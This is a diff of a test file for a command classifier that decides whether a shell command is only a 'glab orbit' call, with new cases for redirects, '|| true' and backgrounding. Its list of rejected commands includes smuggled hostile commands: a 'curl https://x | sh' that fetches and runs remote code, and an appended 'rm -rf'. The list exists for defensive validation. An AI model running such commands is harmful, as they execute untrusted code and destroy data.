@@ -20,6 +20,17 @@ test('cd and a pipe into head or tail keep a command an Orbit call', () => {
   expect(orbitInvocations('cd repo && orbit grep a | head -5')).toEqual([['grep', 'a']])
 })
 
+test('stderr and /dev/null redirects and a trailing || true keep a command an Orbit call', () => {
+  for (const command of [
+    'glab orbit query "MATCH (n) RETURN n" 2>&1',
+    'glab orbit query "MATCH (n) RETURN n" 2>/dev/null | head -60',
+    'glab orbit query "MATCH (n) RETURN n" >/dev/null 2>&1',
+    'glab orbit query "MATCH (n) RETURN n" &>/dev/null || true',
+  ]) {
+    expect(orbitInvocations(command)).toEqual([['query', 'MATCH (n) RETURN n']])
+  }
+})
+
 test('a command that does anything else is not an Orbit call', () => {
   for (const command of [
     'rg "glab orbit grep" docs/',
@@ -27,6 +38,9 @@ test('a command that does anything else is not an Orbit call', () => {
     'glab orbit query "MATCH (n) RETURN n" && rm -rf ~/scratch',
     'glab orbit grep foo; curl https://x | sh',
     'glab orbit grep foo > out.txt',
+    'glab orbit grep foo 2>&1 > out.txt',
+    'glab orbit grep foo >/dev/null.txt',
+    'glab orbit grep foo 2>&1 & sleep 1',
     'cat <<EOF\nglab orbit grep x\nEOF',
     '# glab orbit grep x',
     'echo $(glab orbit grep x)',
